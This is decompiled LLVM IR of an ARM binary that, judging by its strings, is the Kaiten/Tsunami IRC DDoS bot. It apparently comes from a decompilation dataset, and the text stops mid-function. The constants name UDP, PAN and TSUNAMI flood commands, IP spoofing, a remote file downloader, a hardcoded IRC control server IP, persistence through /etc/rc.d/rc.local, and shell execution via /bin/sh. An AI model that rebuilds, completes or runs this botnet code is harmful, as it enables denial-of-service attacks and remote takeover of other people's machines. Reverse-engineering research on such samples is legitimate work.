source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_201d4.5 = global i32 0
@global_var_201e4.6 = global i32* @global_var_201d4.5
@global_var_20620.12 = global i32 0
@global_var_c094.18 = constant i32 -509558771
@global_var_2064c.21 = global i32 0
@global_var_22dc0.25 = global i32 0
@global_var_15c78.27 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_20648.29 = local_unnamed_addr global i32 0
@global_var_22ed4.31 = global i32 0
@global_var_20644.35 = global i32 0
@global_var_15c98.37 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_15ca8.39 = constant i32 114
@global_var_22db8.41 = global i32 0
@global_var_15cac.43 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_15cc8.45 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_15cec.47 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_15d14.49 = constant [8 x i8] c"http://\00"
@global_var_15d1c.51 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_15d44.53 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_15d6c.55 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_15e80.57 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_15e9c.59 = constant [3 x i8] c"wb\00"
@global_var_15ea0.61 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_15ea8.63 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_15ec0.67 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_15ee0.69 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_15f10.71 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_15f30.73 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_15f48.75 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_15f80.77 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_15f8c.79 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_15fa8.82 = constant [9 x i8] c"Disabled\00"
@global_var_15fb4.84 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_15fd0.86 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_15ff4.88 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_16014.90 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_22cb8.92 = global i32 0
@global_var_1603c.94 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1605c.96 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_16078.102 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_16098.105 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_160b4.107 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_160d4.109 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_160f4.113 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_16140.115 = constant [3 x i8] c".0\00"
@global_var_20a4c.117 = global i32 0
@global_var_16144.120 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_16168.122 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_16190.124 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_161ac.126 = constant i32 2
@global_var_161fc.128 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_16224.130 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_1623c.132 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_16260.134 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_22ec8.142 = global i32 0
@global_var_20638.144 = global i32 0
@global_var_22ed0.185 = local_unnamed_addr global i32 0
@global_var_22dbc.187 = global i32 0
@global_var_16a2c.208 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_22ecc.211 = local_unnamed_addr global i32 0
@global_var_16a3c.213 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_16a4c.215 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_16a54.217 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_16a60.222 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_201ec.232 = local_unnamed_addr global i32 1
@global_var_15c68.234 = constant [16 x i8] c"212.109.222.122\00"
@global_var_201f0.235 = global [16 x i8]* @global_var_15c68.234
@global_var_16ae0.238 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_16af4.241 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_16b04.243 = constant i32 47
@global_var_16b08.245 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_16b10.247 = constant i32 97
@global_var_16b14.249 = constant [6 x i8] c"-bash\00"
@global_var_22dc4.253 = local_unnamed_addr global i32 0
@global_var_16b1c.256 = constant [4 x i8] c"#AS\00"
@global_var_16b20.259 = constant i32 0
@global_var_16b24.263 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_16b50.267 = constant i32 10
@global_var_16ac0.269 = constant [4 x i8] c"352\00"
@global_var_20278.270 = global [4 x i8]* @global_var_16ac0.269
@global_var_16b54.272 = constant [6 x i8] c"ERROR\00"
@global_var_22c80.274 = global i32 0
@global_var_202bc = external local_unnamed_addr global i32
@global_var_22c90.281 = global i32 0
@global_var_202f0.287 = global i32 0
@global_var_20a6c.289 = global i32 0
@global_var_fdcc.291 = constant i32 -481296384
@global_var_cff8.292 = constant i32 -442564544
@global_var_20a70.294 = global i32 0
@global_var_20a50.296 = global i32 0
@global_var_20a68.301 = global i32 0
@global_var_16e5c.309 = constant [8 x i8] c"/bin/sh\00"
@global_var_16e64.311 = constant [3 x i8] c"sh\00"
@global_var_16e68.313 = constant [3 x i8] c"-c\00"
@global_var_20308.320 = global i32 2
@global_var_202d8.326 = global i32 0
@global_var_d708.327 = constant i32 -442564492
@global_var_202d4.329 = global i32* bitcast (i8** @global_var_2030c.277 to i32*)
@global_var_16e6c.335 = constant i32 0
@global_var_d8c8.340 = constant i32 -382910448
@global_var_11684.341 = constant i32 -382909968
@global_var_11740.342 = constant i32 -382910224
@global_var_16ea0.344 = constant i32 135270416
@global_var_16e84.346 = constant [6 x i8] c"(nil)\00"
@global_var_16e8c.349 = constant [7 x i8] c"(null)\00"
@global_var_16e94.351 = constant i32 2949163
@global_var_16f20.354 = constant i32 16843008
@global_var_16f08.356 = constant i32 327688
@global_var_205f0 = external global i32
@global_var_17eca.361 = constant i32 65536
@global_var_16f00.363 = constant [8 x i8] c" +0-#'I\00"
@global_var_16ea8.365 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_16ee8.367 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_16edb.369 = constant i32 117506048
@global_var_16edc.371 = constant i32 252117248
@global_var_16ecc.373 = constant i32 331776
@global_var_16ebc.375 = constant i32 335616
@global_var_efec.411 = constant i32 -456978431
@global_var_16f3c.415 = constant [8 x i8] c"Success\00"
@global_var_16f2c.417 = constant [15 x i8] c"Unknown error \00"
@global_var_205f8.419 = global i32* @global_var_17eca.361
@global_var_ef60.420 = constant [3 x i8] c"N\0D\00"
@global_var_22a74.422 = global i32 0
@global_var_22c44.426 = global i32 0
@global_var_22a78.428 = global i32 0
@global_var_20600.430 = global i32 0
@global_var_22f0c.435 = global i32 0
@global_var_22f00.438 = global i32 0
@global_var_22c58.440 = global i32 0
@global_var_204f8.443 = global i32 256
@global_var_203fc.444 = global i32* @global_var_204f8.443
@global_var_22ed8.448 = global i32 0
@global_var_1143c.449 = constant i32 -382910416
@global_var_fe4c.456 = constant i32 -442564520
@global_var_20504.462 = global i32 0
@global_var_11494.464 = constant i32 -481230848
@global_var_22c70.466 = global i32 0
@global_var_11248.468 = constant i32 -509587456
@global_var_2051c.470 = global i32 0
@global_var_20534 = external global i32
@global_var_17a98.489 = constant i32 0
@global_var_22c74.497 = local_unnamed_addr global i32 0
@global_var_d810.500 = constant i32 -382910416
@global_var_22c7c.502 = global i32 0
@global_var_201c8.505 = global i32 -1
@global_var_22c84.508 = global i32 0
@global_var_22c88.510 = local_unnamed_addr global i32 0
@global_var_10d38.511 = constant i32 -390234096
@global_var_17ac0.513 = constant [10 x i8] c"/dev/null\00"
@global_var_22c8c.515 = global i32 0
@global_var_d790.519 = constant i32 -382909968
@global_var_22c78.521 = local_unnamed_addr global i32 0
@global_var_205e8 = external local_unnamed_addr global i32
@global_var_cec4.534 = constant i32 -442564608
@global_var_11000.536 = constant i32 -335544701
@global_var_11150.539 = constant i32 -275775369
@global_var_22cb4.542 = global i32 0
@global_var_22c94.544 = global i32 0
@global_var_180cc.548 = constant [4 x i8] c"inf\00"
@global_var_180e0.551 = constant i32 1076101120
@global_var_180cf.556 = constant i32 1179535616
@global_var_180dc.558 = constant i32 2883630
@global_var_eae8.560 = constant i32 -382908944
@global_var_22c98.568 = global i32 0
@global_var_22cb0.573 = global i32 0
@global_var_cbe4.578 = constant i32 -382910448
@global_var_22f10.581 = global i32 0
@global_var_18128.583 = constant i32 46
@global_var_22ef0.585 = global i32 0
@global_var_13324.587 = constant i32 -369098656
@global_var_1812c.594 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_18140.596 = constant i32 114
@global_var_18144.598 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1815c.601 = constant [11 x i8] c"nameserver\00"
@global_var_18168.604 = constant [7 x i8] c"domain\00"
@global_var_18170.606 = constant [7 x i8] c"search\00"
@global_var_22f14.611 = global i32 0
@global_var_22f18.613 = global i32 0
@global_var_1818c.622 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_18178.624 = constant i32 0
@global_var_181a0.627 = constant [3 x i8] c"%x\00"
@global_var_181a4.630 = constant [11 x i8] c"/etc/hosts\00"
@global_var_181b0.632 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_153c0.637 = constant i32 -504313148
@global_var_153a8.638 = constant i32 -483131392
@global_var_15268.639 = constant i32 -481294847
@global_var_15420.640 = constant i32 -477821825
@global_var_1580c.641 = constant i32 -516685812
@global_var_15710.642 = constant i32 -905969576
@global_var_1588c.643 = constant i32 -478149505
@global_var_15874.644 = constant i32 -534773758
@global_var_15828.645 = constant i32 -534773758
@global_var_157c0.646 = constant i32 -483131392
@global_var_201cc.648 = global i32 0
@global_var_2061c.3 = external global i8*
@global_var_2063c.23 = external global i8*
@global_var_20640.33 = external global i8*
@global_var_20643.224 = external local_unnamed_addr global i8*
@global_var_20642.225 = external local_unnamed_addr global i8*
@global_var_20641.226 = external local_unnamed_addr global i8*
@1 = internal constant [3 x i8] c" \01\00"
@global_var_2030c.277 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_2035c.278 = local_unnamed_addr global i8 16
@global_var_10d4c.283 = constant i8 0
@global_var_2030d.332 = local_unnamed_addr global i8 1
@global_var_2035d.333 = local_unnamed_addr global i8 1
@global_var_205d0.493 = global i64* null
@2 = internal constant [2 x i8] c"\01\00"
@global_var_205fc.575 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_205fd.576 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @function_15c18(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2061c.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2061c.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_201e4.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_201e4.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_201e4.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_201e4.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2061c.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_201e4.6, { 1, 0 }
  uselistorder i8** @global_var_2061c.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 131544 to i32*), align 8
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 131544

bb2:                                              ; preds = %.thread
  ret i32 131544

; uselistorder directives
  uselistorder i32 131544, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_10dec(i32 ptrtoint (i32* @global_var_c094.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 89172, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_1021c()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_81cc:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v6_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = load i8, i8* %arg1, align 1
  %v7_81f4 = icmp eq i8 %v2_81e8, 42
  br i1 %v7_81f4, label %dec_label_pc_8228, label %dec_label_pc_81fc

dec_label_pc_81fc:                                ; preds = %dec_label_pc_81cc
  %v7_8200 = icmp eq i8 %v2_81e8, 63
  br i1 %v7_8200, label %dec_label_pc_8298, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_81fc
  %v2_820c = icmp eq i8 %v2_81e8, 0
  br i1 %v2_820c, label %dec_label_pc_8218, label %dec_label_pc_82f0

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208
  %v2_821c = load i8, i8* %tmp, align 1
  %v3_821c = zext i8 %v2_821c to i32
  br label %dec_label_pc_8364

dec_label_pc_8228:                                ; preds = %dec_label_pc_81cc
  %v1_822c = add i32 %tmp9, 1
  %v3_8238 = inttoptr i32 %v1_822c to i8*
  %v4_8238 = call i32 @function_81cc(i8* %v3_8238, i32 %arg2)
  %v2_8240 = icmp eq i32 %v4_8238, 0
  br i1 %v2_8240, label %dec_label_pc_8284, label %dec_label_pc_8248

dec_label_pc_8248:                                ; preds = %dec_label_pc_8228
  %v2_824c = load i8, i8* %tmp, align 1
  %v2_8250 = icmp eq i8 %v2_824c, 0
  br i1 %v2_8250, label %dec_label_pc_828c, label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_8248
  %v1_825c = add i32 %arg2, 1
  %v4_8268 = call i32 @function_81cc(i8* nonnull %arg1, i32 %v1_825c)
  %v2_8270 = icmp eq i32 %v4_8268, 0
  br i1 %v2_8270, label %dec_label_pc_8284, label %dec_label_pc_828c

dec_label_pc_8284:                                ; preds = %dec_label_pc_8258, %dec_label_pc_8228
  br label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8248, %dec_label_pc_8258, %dec_label_pc_8284
  %storemerge4 = phi i32 [ 0, %dec_label_pc_8284 ], [ 1, %dec_label_pc_8258 ], [ 1, %dec_label_pc_8248 ]
  br label %dec_label_pc_8364

dec_label_pc_8298:                                ; preds = %dec_label_pc_81fc
  %v2_829c = load i8, i8* %tmp, align 1
  %v2_82a0 = icmp eq i8 %v2_829c, 0
  br i1 %v2_82a0, label %dec_label_pc_82e4, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %dec_label_pc_8298
  %v1_82ac = add i32 %tmp9, 1
  %v1_82b4 = add i32 %arg2, 1
  %v2_82c0 = inttoptr i32 %v1_82ac to i8*
  %v3_82c0 = call i32 @function_81cc(i8* %v2_82c0, i32 %v1_82b4)
  %v2_82c8 = icmp ne i32 %v3_82c0, 0
  %. = zext i1 %v2_82c8 to i32
  br label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82a8, %dec_label_pc_8298
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8298 ], [ %., %dec_label_pc_82a8 ]
  br label %dec_label_pc_8364

dec_label_pc_82f0:                                ; preds = %dec_label_pc_8208
  %v2_82f4 = load i8, i8* %arg1, align 1
  %v3_82f4 = zext i8 %v2_82f4 to i32
  %v1_82fc = call i32 @function_ce90(i32 %v3_82f4)
  store i32 %v1_82fc, i32* @r4, align 4
  %v2_8308 = load i8, i8* %tmp, align 1
  %v3_8308 = zext i8 %v2_8308 to i32
  %v1_8310 = call i32 @function_ce90(i32 %v3_8308)
  %v0_8318 = load i32, i32* @r4, align 4
  %v9_8318 = icmp eq i32 %v0_8318, %v1_8310
  br i1 %v9_8318, label %dec_label_pc_8320, label %dec_label_pc_835c

dec_label_pc_8320:                                ; preds = %dec_label_pc_82f0
  %v1_8324 = add i32 %tmp9, 1
  %v1_832c = add i32 %arg2, 1
  %v2_8338 = inttoptr i32 %v1_8324 to i8*
  %v3_8338 = call i32 @function_81cc(i8* %v2_8338, i32 %v1_832c)
  %v2_8340 = icmp ne i32 %v3_8338, 0
  %.8 = zext i1 %v2_8340 to i32
  br label %dec_label_pc_835c

dec_label_pc_835c:                                ; preds = %dec_label_pc_8320, %dec_label_pc_82f0
  %storemerge = phi i32 [ 1, %dec_label_pc_82f0 ], [ %.8, %dec_label_pc_8320 ]
  br label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_82e4, %dec_label_pc_828c, %dec_label_pc_8218, %dec_label_pc_835c
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_828c ], [ %storemerge3, %dec_label_pc_82e4 ], [ %v3_821c, %dec_label_pc_8218 ], [ %storemerge, %dec_label_pc_835c ]
  store i32 %v3_81d0, i32* @r4, align 4
  store i32 %v6_81d0, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @function_ce90, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8364, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_828c, { 2, 1, 0 }
}

define i32 @function_8374(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8374:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8374 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8374, i32* @ip, align 4
  %v6_8378 = load i32, i32* @r2, align 4
  store i32 %v6_8378, i32* %stack_var_-8, align 4
  %v3_837c = load i32, i32* @fp, align 4
  store i32 33668, i32* %stack_var_-16, align 4
  %v2_8380 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8380, i32* @fp, align 4
  %v4_8390 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_2064c.21 to i32), i32* @r0, align 4
  %v3_83a4 = call i32 @function_d05c(i32 ptrtoint (i32* @global_var_2064c.21 to i32), i32 %arg2, i32 %v4_8390)
  store i32 ptrtoint (i32* @global_var_2064c.21 to i32), i32* @r0, align 4
  %v0_83ac = call i32 @function_f030()
  store i32 %v0_83ac, i32* @r2, align 4
  %v3_83c0 = call i32 @function_ce64(i32 %arg1, i32* nonnull @global_var_2064c.21)
  store i32 %v3_837c, i32* @fp, align 4
  ret i32 %v3_83c0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2064c.21 to i32), { 1, 0, 2 }
}

define i32 @function_83d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_83d8:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  %v3_83dc = load i32, i32* @fp, align 4
  store i32 33764, i32* %stack_var_-4, align 4
  %v2_83e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_83e0, i32* @fp, align 4
  %v2_83f0 = load i8, i8* bitcast (i8** @global_var_2063c.23 to i8*), align 4
  %v7_83f4 = icmp eq i8 %v2_83f0, 1
  br i1 %v7_83f4, label %dec_label_pc_83fc, label %dec_label_pc_8420

dec_label_pc_83fc:                                ; preds = %dec_label_pc_83d8
  %v2_8400 = load i32, i32* @global_var_22dc0.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_8410 = call i32 @function_8374(i32 %v2_8400, i32 ptrtoint ([30 x i8]* @global_var_15c78.27 to i32))
  br label %dec_label_pc_8524

dec_label_pc_8420:                                ; preds = %dec_label_pc_83d8
  %v0_8420 = call i32 @function_cc10()
  %v2_8430 = icmp eq i32 %v0_8420, 0
  br i1 %v2_8430, label %dec_label_pc_8438, label %dec_label_pc_8444

dec_label_pc_8438:                                ; preds = %dec_label_pc_8420
  br label %dec_label_pc_8524

dec_label_pc_8444:                                ; preds = %dec_label_pc_8420
  %v2_8448 = load i32, i32* @global_var_20648.29, align 4
  %v1_844c = add i32 %v2_8448, 1
  store i32 %v1_844c, i32* @global_var_20648.29, align 4
  %v3_8460 = mul i32 %v1_844c, 4
  %v1_8464 = add i32 %v3_8460, 4
  %v1_846c = call i32 @function_fc78(i32 %v1_8464)
  %v2_84c812 = load i32, i32* @global_var_20648.29, align 4
  %v9_84d414 = icmp eq i32 %v2_84c812, 1
  br i1 %v9_84d414, label %dec_label_pc_84dc, label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %dec_label_pc_8444, %dec_label_pc_8484
  %storemerge116 = phi i32 [ %v1_84bc, %dec_label_pc_8484 ], [ 0, %dec_label_pc_8444 ]
  %v3_8488 = mul i32 %storemerge116, 4
  %v2_8494 = add i32 %v3_8488, %v1_846c
  %v2_84a8 = load i32, i32* @global_var_22ed4.31, align 4
  %v2_84ac = add i32 %v2_84a8, %v3_8488
  %v1_84b0 = inttoptr i32 %v2_84ac to i32*
  %v2_84b0 = load i32, i32* %v1_84b0, align 4
  %v2_84b4 = inttoptr i32 %v2_8494 to i32*
  store i32 %v2_84b0, i32* %v2_84b4, align 4
  %v1_84bc = add i32 %storemerge116, 1
  %v2_84c8 = load i32, i32* @global_var_20648.29, align 4
  %v1_84cc = add i32 %v2_84c8, -1
  %tmp = icmp ugt i32 %v1_84cc, %v1_84bc
  br i1 %tmp, label %dec_label_pc_8484, label %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge

dec_label_pc_84c4.dec_label_pc_84dc_crit_edge:    ; preds = %dec_label_pc_8484
  br label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8444, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge
  %v2_84c8.lcssa = phi i32 [ %v2_84c8, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge ], [ %v2_84c812, %dec_label_pc_8444 ]
  %v3_84e4 = mul i32 %v2_84c8.lcssa, 4
  %v2_84f0 = add i32 %v1_846c, -4
  %v1_84f4 = add i32 %v2_84f0, %v3_84e4
  %v2_84fc = inttoptr i32 %v1_84f4 to i32*
  store i32 %v0_8420, i32* %v2_84fc, align 4
  %v2_8504 = load i32, i32* @global_var_22ed4.31, align 4
  store i32 %v2_8504, i32* @r0, align 4
  %v0_850c = call i32 @function_fdcc()
  store i32 %v1_846c, i32* @global_var_22ed4.31, align 4
  br label %dec_label_pc_8524

dec_label_pc_8524:                                ; preds = %dec_label_pc_8438, %dec_label_pc_83fc, %dec_label_pc_84dc
  %v3_8524 = phi i32 [ 0, %dec_label_pc_8438 ], [ 1, %dec_label_pc_83fc ], [ %v0_8420, %dec_label_pc_84dc ]
  store i32 %v3_83dc, i32* @fp, align 4
  ret i32 %v3_8524

